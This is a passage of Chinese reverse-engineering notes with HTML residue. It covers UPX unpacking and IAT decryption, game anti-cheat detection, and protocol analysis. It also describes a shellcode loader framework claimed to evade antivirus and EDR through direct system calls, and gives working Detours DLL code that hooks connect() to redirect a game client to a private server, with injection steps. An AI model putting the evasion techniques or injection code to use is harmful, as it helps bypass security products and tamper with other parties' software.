4.拷贝预存的代码到缓冲区，将导出函数地址写入到缓冲区中</span><br><span class=\"line\">     5.将缓冲区首地址写入IAT处，完成填充IAT的操作</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">如何解密IAT？此处从函数地址入手，如果当我们获取了原始函数地址，且在写入IAT时，寄存器中还保存的是原始函数地址，那解密IAT就会变得很容易完成。如果代码是线性执行，我们只需改一下跳转应该就可以完成了，但是现在代码混淆度比较高，比较难找到规律，虽然说只要足够耐心，更改跳转应该可以实现，仔细跟踪代码，可以发现其实函数地址最初保存在EAX中，而后保存在EDX中，之后EDX被修改为IAT地址，EAX修改为加密的地址，在这个过程中，只要我们能做到EAX最后是函数地址即可。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">找向上跳的代码，即循环的代码，大概率是在循环解压原来的代码</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>首先要先在加壳后的程序中定位到原程序的入口点。使用 x64dbg 打开后直接运行一步，发现停在了 <code>pushad</code>  上。该指令将所有寄存器的值压栈，而在 UPX 的执行流程里，这一步之后会加载 UPX 的解压代码用于将原始程序解压。upx 的工作原理其实是这样的：首先将程序压缩。所谓的压缩包括两方面，一方面在程序的开头或者其他合适的地方插入一段代码，另一方面是将程序的其他地方做压缩。压缩也可以叫做加密，因为压缩后的程序比较难看懂，主要是和原来的代码有很大的不同。最大的表现也就是他的主要作用就是程序本身变小了。变小之后的程序在传输方面有很大的优势。其次就是在程序执行时，实时的对程序解压缩。解压缩功能是在第一步时插入的代码完成的功能。联起来就是：upx 可以完成代码的压缩和实时解压执行。且不会影响程序的执行效率。</p>\n<p>upx 和普通的压缩，解压不同点就算在于 upx 是实时解压缩的。实时解压的原理可以使用一下图形表示：</p>\n<p>graph LR;</p>\n<p>1–&gt;2–&gt;3–&gt;4–&gt;5–&gt;6;</p>\n<p>假设 1 是 upx 插入的代码，2，3，4 是压缩后的代码。5，6 是随便的什么东西。程序从 1 开始执行。而 1 的功能是将 2，3，4 解压缩为 7，8，9。7，8，9 就是 2，3，4 在压缩之前的形式。</p>\n<p>1</p>\n<p>2</p>\n<p>graph LR;</p>\n<p>1–&gt;7–&gt;8–&gt;9–&gt;5–&gt;6;</p>\n<p>连起来就是：</p>\n<p>1</p>\n<p>2</p>\n<p>3</p>\n<p>4</p>\n<p>5</p>\n<p>6</p>\n<p>graph LR;</p>\n<p>1==&gt;2-.-&gt;3-.-&gt;4-.-&gt;5;</p>\n<p>7==&gt;8==&gt;9==&gt;5==&gt;6;</p>\n<p>2–&gt; 解密–&gt;7;</p>\n<p>3–&gt; 解密–&gt;8;</p>\n<p>4–&gt; 解密–&gt;9;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">跟壳的时候多用F7除非是往下一句跳的，F8会有触发暗桩程序跑飞的风险</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### shellcode免杀</span><br><span class=\"line\"></span><br><span class=\"line\">之前分析CS4的stage时，遂介绍之前所写shellcode框架，该框架的shellcode执行部分利用系统特性和直接系统调用（Direct System Call）执行，得以免杀主流杀软（火绒、360全部产品、毒霸等）,该方式也是主流绕过3环AV、EDR、沙箱的常用手段。</span><br><span class=\"line\"></span><br><span class=\"line\">-  该框架主要由四个项目组成：</span><br><span class=\"line\">    GenerateShellCode：负责生成相关功能的shellcode。</span><br><span class=\"line\">    EncryptShellCode：负责以AES128加密所将执行的shellcode。</span><br><span class=\"line\">    FunctionHash：负责计算shell中所用到函数的hash值。</span><br><span class=\"line\">    XShellCodeLoader：负责执行加密后的shellcode。</span><br><span class=\"line\">-  shellcode脱壳之（GenerateShellCode原理）</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### 恶意软件脱壳之（MIR4手工脱壳）</span><br><span class=\"line\"></span><br><span class=\"line\">不是所有的壳都能通过F4中断，F2+F9 </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### 网络验证</span><br><span class=\"line\"></span><br><span class=\"line\">bp send</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">bp GetPrivateProfileStringA     // 读配置文件</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">通过GetVersion判断壳有没有被解压，易语言通用。可以hook GetVersion</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">## 游戏外挂基础</span><br><span class=\"line\"></span><br><span class=\"line\">- 光子时代的新型反外挂（2016-2022）</span><br><span class=\"line\"></span><br><span class=\"line\">1. 动态检测游戏协议交互流量（登录，游戏关卡，地面环境，建筑物，技能，走路，副本，任务等）</span><br><span class=\"line\">2. 后台机器学习（多模式场景匹配，智能AI大脑模拟）</span><br><span class=\"line\">3. 全程无感知实时动态抓取场景</span><br><span class=\"line\">4. 后台推送到手机APP或PC游戏登录大厅</span><br><span class=\"line\">5. 场景建模外挂溯源自动化分析</span><br><span class=\"line\">6. 游戏封号大数据检测模式</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">![image-20231016154845700](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231016154845700.png) </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>1.1.1 执行时间</p>\n<p>当游戏被调试时，运行肯定会变慢，我们可以检测游戏主循环的运行时间，来判断是否被调试，实际上这种检测是最难拔出的</p>\n<p>“暗桩”。</p>\n<p>1.1.2 调试位检测<br>\n windows 提供了一些 api 来检测，例如 IsDebuggerPresent、CheckRemoteDebuggerPresent。<br>\n// IsDebuggerPresentstatic bool xx_is_debug_1()<br>\n{<br>\nreturn IsDebuggerPresent();}// CheckRemoteDebuggerPresentstatic bool xx_is_debug_2()<br>\n{<br>\nBOOL debuged = false;<br>\nbool ret =  CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;debuged);<br>\nreturn ret &amp;&amp; TRUE == debuged;<br>\n}</p>\n<p>1.2 硬件断点检测<br>\n硬件断点既是调试手段、也是一种 hook 手段，反外挂时一定要检测的。检测时有两种手段：<br>\n1.GetThreadContext: 获取寄存器信息，判断 Dr0~Dr3 如果不是 0，则被下了硬件断点。<br>\n2. 硬件断点占坑：硬件断点只有 4 个，反外挂系统把硬件断点占住，我只要检测我的断点存在即可。<br>\n我使用了硬件断点占坑方式检测，因为调用 GetThreadContext 检测时容易被 hook。<br>\n后期我们做对抗时，发现可以用设置内存属性，来绕过硬件断点占坑，以后会写一篇文章来介绍。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">- #### 信息收集</span><br><span class=\"line\"></span><br><span class=\"line\">1. 信息收集是反外挂系统的重要组成部分，可以帮助我们收集玩家使用外挂证据、收集外挂等。</span><br><span class=\"line\"></span><br><span class=\"line\">2. 玩家监控：我们会重点监控“重点玩家”的信息，重点玩家来自于玩家举报，我们会加入监控观察一周。</span><br><span class=\"line\"></span><br><span class=\"line\">3. 游戏程序修改：反外挂系统会全量检测游戏.exe和d3d9.dll的代码段，发现修改就把版本和修改的地址上报，会定时分析其中可疑的味道。</span><br><span class=\"line\"></span><br><span class=\"line\">   没有D3D9游戏是跑不起来的。</span><br><span class=\"line\"></span><br><span class=\"line\">4. 文件上传：这个功能有点流氓，我们控制台可以指定上传玩家本地的文件，是我们收集外挂的重要手段。</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">![img](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1769d036135e4eb29d922bd5e5fa1c9a.png) </span><br><span class=\"line\"></span><br><span class=\"line\">协议分析是游戏漏洞挖掘的关键，确定游戏的协议是漏洞挖掘的前置条件。游戏客户端与服务器间通过事先定义的协议进行通信。只不过通信的数据往往被加密后，难以从信道上直接获取有效信息。弄清楚数据打包的过程，便是协议获取的关键。打个不恰当的比喻，在未学习其他语言基本知识时，我们很难听懂外国人对话的，此时了解了加密过程，就好比将他们的对话翻译成国语，了解了序列号过程，就好比知道了他们的断句，有了可读懂的语言，再加上断句，我们就能清楚的知道他们每一句话的意思。协议分析也是这个道理，其分析的关键便是弄清楚明文数据和序列化过程。。</span><br><span class=\"line\"></span><br><span class=\"line\">一般协议的明文buff分析，多从游戏的socket连接开始进行逆向分析，借助网络工具，可以清楚的了解到游戏使用的tcp/udp链接，然后针对性对send/sendto, recv/recvfrom下断点进行逆向。部分游戏因为自身的复杂性，可能会有多个socket连接，一般我们可以通过分析每一次数据交互过程，进一步确定游戏选择的是哪个socket进行数据传输。</span><br><span class=\"line\"></span><br><span class=\"line\">为更加清楚的说明协议分析的过程，笔者选取一款游戏进行说明。首先通过net-peeker发现游戏仅仅采用了TCP链接，OD附加后直接对send下断，发现游戏有多个调用地址调用了call，于是分析每一次send的参数，当在游戏内进行网络操作时，拦截</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">TCP</span><br><span class=\"line\"></span><br><span class=\"line\">send/receive</span><br><span class=\"line\"></span><br><span class=\"line\">wsasend / wsarec</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">### 游戏加载分析</span><br><span class=\"line\"></span><br><span class=\"line\">1.先对登录器传入命令行参数判断</span><br><span class=\"line\"></span><br><span class=\"line\">2.删除日志文件和敏感文件</span><br><span class=\"line\"></span><br><span class=\"line\">3.获取版本号信息</span><br><span class=\"line\"></span><br><span class=\"line\">4.对窗口名称做格式化</span><br><span class=\"line\"></span><br><span class=\"line\">5.注册窗口，设置回调</span><br><span class=\"line\"></span><br><span class=\"line\">6.读取bin文件</span><br><span class=\"line\"></span><br><span class=\"line\">7.读取资源文件</span><br><span class=\"line\"></span><br><span class=\"line\">8.创建游戏窗口</span><br><span class=\"line\"></span><br><span class=\"line\">9.调用消息循环</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Cabal EP8 搭建</span><br><span class=\"line\"></span><br><span class=\"line\">[惊天动地EP8仿官方_2021最新一键端-游戏收藏-风帆资源站 (fengfan.mobi)](http://fengfan.mobi/post/392.html)</span><br><span class=\"line\"></span><br><span class=\"line\">[惊天动地EP8_2021单机_VBOX虚拟机版_免费高速下载|百度网盘-分享无限制 (baidu.com)](https://pan.baidu.com/s/18NNNWyB-WWBHuerxG-h5WA#list/path=%2Fsharelink1957418918-186929007833136%2F惊天动地EP8_2021单机_VBOX虚拟机版&amp;parentPath=%2Fsharelink1957418918-186929007833136)</span><br><span class=\"line\"></span><br><span class=\"line\">[架设◆ 惊天动地◆ 数据库、服务端、虚拟机、Linux、等方面疑问全面解答◆_惊天动地物品代码-CSDN博客](https://blog.csdn.net/xxuanwan/article/details/2989990)</span><br><span class=\"line\"></span><br><span class=\"line\">[端游《惊天动地EP8》VM一键端+视频教程+GM工具_免费高速下载|百度网盘-分享无限制 (baidu.com)](https://pan.baidu.com/s/1Bpj1Ee1T0TMEsHeZ9S64Gg?pwd=2xtb#list/path=%2Fsharelink3943911796-914199683682089%2F端游《惊天动地EP8》VM一键端%2B视频教程%2BGM工具%2F惊天动地EP8客户端&amp;parentPath=%2Fsharelink3943911796-914199683682089)</span><br><span class=\"line\"></span><br><span class=\"line\">[端游《惊天动地EP8》CABALEP8三变190版本 VM一键端+视频教程+GM工具-网游单机网-脚本王 (jiaobenwang.com)](https://jiaobenwang.com/6407.html)</span><br><span class=\"line\"></span><br><span class=\"line\">[[CentOS 7/8 Repack\\] Full Cabal Server Installation + CentOS SQL (Database) [Updated 2023] | RaGEZONE - MMO Development Forums](https://forum.ragezone.com/threads/centos-7-8-repack-full-cabal-server-installation-centos-sql-database-updated-2023.1144251/)</span><br><span class=\"line\"></span><br><span class=\"line\">[【精选】CABAL_EP8_Centos7配置记录-CSDN博客](https://blog.csdn.net/weixin_43199687/article/details/121342818)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">1.通过栈回溯法找到命令行参数</span><br><span class=\"line\"></span><br><span class=\"line\">bp CreateProcessA  &amp;&amp; bp CreateProcessW</span><br><span class=\"line\"></span><br><span class=\"line\">找到调用的地方，依次执行到返回，直到出现命令行参数</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0042890C    68 C9EC4100     push 单机登录.0041ECC9                       ; ASCII “\\Main.exe f7a9q_1 &amp; exit”<br>\n00428911    FF75 FC         push dword ptr ss:[ebp-0x4]<br>\n 00428914    68 E2EC4100     push 单机登录.0041ECE2                       ; ASCII &quot;cmd /c @echo off &amp; start&quot;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">下次启动的时候就不需要调用启动器了，直接执行main即可</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">2.找到所连接的服务器IP</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>// bp ws2_32.connect<br>\n004A81C6  |.  57                 push edi<br>\n004A81C7  |.  FF75 08            push [arg.1]\t\t\t// IP<br>\n004A81CA  |.  33C0               xor eax,eax<br>\n004A81CC  |.  8D7D F0            lea edi,[local.4]<br>\n004A81CF  |.  AB                 stos dword ptr es:[edi]<br>\n004A81D0  |.  AB                 stos dword ptr es:[edi]<br>\n004A81D1  |.  AB                 stos dword ptr es:[edi]<br>\n004A81D2  |.  AB                 stos dword ptr es:[edi]<br>\n004A81D3  |.  66:C745 F0 0200    mov word ptr ss:[ebp-0x10],0x2<br>\n004A81D9  |.  FF15 48660E01      call dword ptr ds:[0x10E6648]            ;  Main.011BD656</p>\n<p>007B9E97   .  8D45 DC            lea eax,dword ptr ss:[ebp-0x24]<br>\n007B9E9A   &gt;  8B0D 60010B01      mov ecx,dword ptr ds:[0x10B0160]<br>\n007B9EA0   .  56                 push esi<br>\n007B9EA1   .  50                 push eax<br>\n007B9EA2   .  E8 102BC7FF        call Main.0042C9B7<br>\n007B9EA7   .  85C0               test eax,eax</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">![image-20231020155759692](https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231020155759692.png) </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">3.通过inline hook修改服务器IP</span><br><span class=\"line\"></span><br><span class=\"line\">```c++</span><br><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\">#include &lt;shellapi.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;tchar.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;  </span><br><span class=\"line\">#include &lt;winsvc.h&gt;</span><br><span class=\"line\">#include &lt;string&gt;  </span><br><span class=\"line\">#include &lt;io.h&gt;</span><br><span class=\"line\">#include &lt;vector&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;Wininet.h&gt;</span><br><span class=\"line\">#include &lt;comdef.h&gt;</span><br><span class=\"line\">#include &lt;IPTypes.h&gt;</span><br><span class=\"line\">#include &lt;WinSock2.h&gt;</span><br><span class=\"line\">#include &quot;detours.h&quot;</span><br><span class=\"line\">//#include &quot;KTools.h&quot;</span><br><span class=\"line\">#pragma comment(lib, &quot;detours.lib&quot;)</span><br><span class=\"line\">#pragma comment(lib, &quot;ws2_32.lib&quot;)  </span><br><span class=\"line\">#pragma comment(lib, &quot;wldap32.lib&quot;) </span><br><span class=\"line\">#pragma comment(lib,&quot;Wininet.lib&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">char  ws2_32[0x100]=&#123;&quot;ws2_32.dll\\0&quot;&#125;;</span><br><span class=\"line\">HMODULE gHookws2_32;</span><br><span class=\"line\">typedef int ( WINAPI * fun_connect)(SOCKET s, const struct sockaddr * name, int namelen);</span><br><span class=\"line\"></span><br><span class=\"line\">fun_connect Hookconnect;</span><br><span class=\"line\"></span><br><span class=\"line\">int WINAPI Myconnect(SOCKET s, const struct sockaddr * name, int namelen)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tSOCKADDR_IN* addr =(SOCKADDR_IN*)name;</span><br><span class=\"line\">\tDWORD GameServerPort;</span><br><span class=\"line\">\tchar GameServerIP[128]=&#123;0&#125;;</span><br><span class=\"line\">\tGameServerPort = ntohs(addr-&gt;sin_port);</span><br><span class=\"line\">\tstrcpy(GameServerIP,inet_ntoa(addr-&gt;sin_addr));</span><br><span class=\"line\">\t//KTools::DbgPrintA(&quot;当前连接的IP：%s | 端口 %d \\r\\n&quot;,GameServerIP,GameServerPort);</span><br><span class=\"line\">\tif (stricmp(GameServerIP,&quot;192.168.56.200&quot;)==0 || stricmp(GameServerIP,&quot;192.168.56.201&quot;)==0)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t//KTools::DbgPrintA(&quot;[ GameServerIP == %s ] \\r\\n&quot;,GameServerIP);\t</span><br><span class=\"line\">\t\tSOCKADDR_IN AddrSock;</span><br><span class=\"line\">\t\tAddrSock.sin_addr.S_un.S_addr=inet_addr(&quot;192.168.13.163&quot;);</span><br><span class=\"line\">\t\tAddrSock.sin_port = addr-&gt;sin_port;</span><br><span class=\"line\">\t\tAddrSock.sin_family = AF_INET;</span><br><span class=\"line\">\t\tint errorx = GetLastError();</span><br><span class=\"line\">\t\tunsigned long ul = 0;</span><br><span class=\"line\">\t\tint ret = ioctlsocket (s, FIONBIO, (unsigned long*)&amp;ul);</span><br><span class=\"line\">\t\treturn Hookconnect(s,(SOCKADDR*)&amp;AddrSock,namelen);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn Hookconnect(s,name,namelen);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BOOL WINAPI Call_HookConnect()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tif (GetModuleHandleA((char *)ws2_32) != NULL)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgHookws2_32 = GetModuleHandleA((char *)ws2_32);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\telse</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tgHookws2_32 = LoadLibraryA((char *)ws2_32);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif (!gHookws2_32)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\treturn FALSE;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tDetourTransactionBegin();</span><br><span class=\"line\">\tDetourUpdateThread(GetCurrentThread());</span><br><span class=\"line\">\tHookconnect = (fun_connect)GetProcAddress(gHookws2_32, &quot;connect&quot;);</span><br><span class=\"line\">\tDetourAttach((PVOID*)&amp;Hookconnect, Myconnect);</span><br><span class=\"line\">\tDetourTransactionCommit();</span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class=\"line\">\t\t\t\t\t  DWORD  ul_reason_for_call,</span><br><span class=\"line\">\t\t\t\t\t  LPVOID lpReserved</span><br><span class=\"line\">\t\t\t\t\t  )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tswitch (ul_reason_for_call)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\tcase DLL_PROCESS_ATTACH:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tCall_HookConnect();</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\tcase DLL_PROCESS_DETACH:</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tbreak;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注入 dll</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021155328899.png\" alt=\"image-20231021155328899\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021155542954.png\" alt=\"image-20231021155542954\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021155654933.png\" alt=\"image-20231021155654933\"></p>\n<p>查找资源文件调用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bp CreateFileA</span><br><span class=\"line\"></span><br><span class=\"line\">下段，F9，直到返回在00470ff5,此时壳已经解压</span><br><span class=\"line\"></span><br><span class=\"line\">注入我们的dll</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021202808623.png\" alt=\"image-20231021202808623\"></p>\n<p>挂接正常 dll，使每次正常 dll 启动拉着我们 dll 一起启动</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021203554786.png\" alt=\"image-20231021203554786\"></p>\n<h3 id=\"加密函数分析\"><a class=\"markdownIt-Anchor\" href=\"#加密函数分析\">#</a> 加密函数分析</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span 